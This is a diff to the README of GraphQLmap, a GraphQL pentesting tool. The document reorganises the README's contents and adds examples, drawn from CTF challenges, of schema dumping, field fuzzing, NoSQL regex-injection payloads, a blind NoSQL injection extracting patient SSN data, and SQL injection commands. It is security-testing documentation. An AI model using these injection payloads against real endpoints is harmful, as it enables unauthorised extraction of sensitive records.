@@ -2,14 +2,16 @@
 
 > GraphQLmap is a scripting engine to interact with a graphql endpoint for pentesting purposes.
 
-Features :
-- Dump a GraphQL schema
-- Interact with a GraphQL endpoint
-- Execute GraphQL queries
-- Autocomplete queries
-- NoSQL injection inside a GraphQL field
-- SQL injection inside a GraphQL field
-- GraphQL field fuzzing
+
+* [Install](#install)
+* [Features and examples](#features-and-examples)
+  - [Dump a GraphQL schema](#dump-a-graphql-schema)
+  - [Interact with a GraphQL endpoint](#interact-with-a-graphql-endpoint)
+  - Execute GraphQL queries
+  - Autocomplete queries
+  - [GraphQL field fuzzing](#graphql-field-fuzzing)
+  - [NoSQL injection inside a GraphQL field](#nosql-injection)
+  - [SQL injection inside a GraphQL field](#sqli-injection)
 
 I :heart: pull requests, feel free to improve this script :)
 
@@ -17,7 +19,7 @@ You can also contribute with a :beers: IRL or using Github Sponsoring button.
 
 ## Install
 
-```
+```basic
 $ git clone github.com/swisskyrepo/GraphQLmap
 $ python graphqlmap.py                                                              
    _____                 _      ____  _                            
@@ -39,10 +41,11 @@ optional arguments:
 ```
 
 
-## Examples
+## Features and examples
 
 :warning: Examples are based on several CTF challenges from HIP2019.
 
+### Dump a GraphQL schema
 
 Use `dump` to dump the GraphQL schema, this function will automaticly populate the "autocomplete" with the found fields.    
 [:movie_camera: Live Example](https://asciinema.org/a/14YuWoDOyCztlx7RFykILit4S)
@@ -71,7 +74,10 @@ Doctor
 [...]
 ```
 
-Write a GraphQL request to execute it.
+
+### Interact with a GraphQL endpoint
+
+Write a GraphQL request and execute it.
 
 ```powershell
 GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admin\"} }"){firstName lastName id}}
@@ -87,6 +93,8 @@ GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admin
     }
 }
 ```
+
+### GraphQL field fuzzing
 
 Use `GRAPHQL_INCREMENT` and `GRAPHQL_CHARSET` to fuzz a parameter.      
 [:movie_camera: Live Example](https://asciinema.org/a/ICCz3PqHVNrBf262x6tQfuwqT)
@@ -110,6 +118,8 @@ GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"AdmiG
 [+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admin\"} }"){firstName lastName id}}
 ```
 
+### NoSQLi injection
+
 Use `BLIND_PLACEHOLDER` inside the query for the `nosqli` function.    
 [:movie_camera: Live Example](https://asciinema.org/a/wp2lixHqRV0pxxhZ8nsgUj6s7)
 
@@ -119,6 +129,15 @@ Query > {doctors(options: "{\"\"patients.ssn\":1}", search: "{ \"patients.ssn\":
 Check > 5d089c51dcab2d0032fdd08d
 [+] Data found: 4f537c0a-7da6-4acc-81e1-8c33c02ef3b
 ```
+
+### SQL injection 
+
+```powershell
+GraphQLmap > postgresqli
+GraphQLmap > mysqli
+GraphQLmap > mssqli
+```
+
 
 ## TODO
 
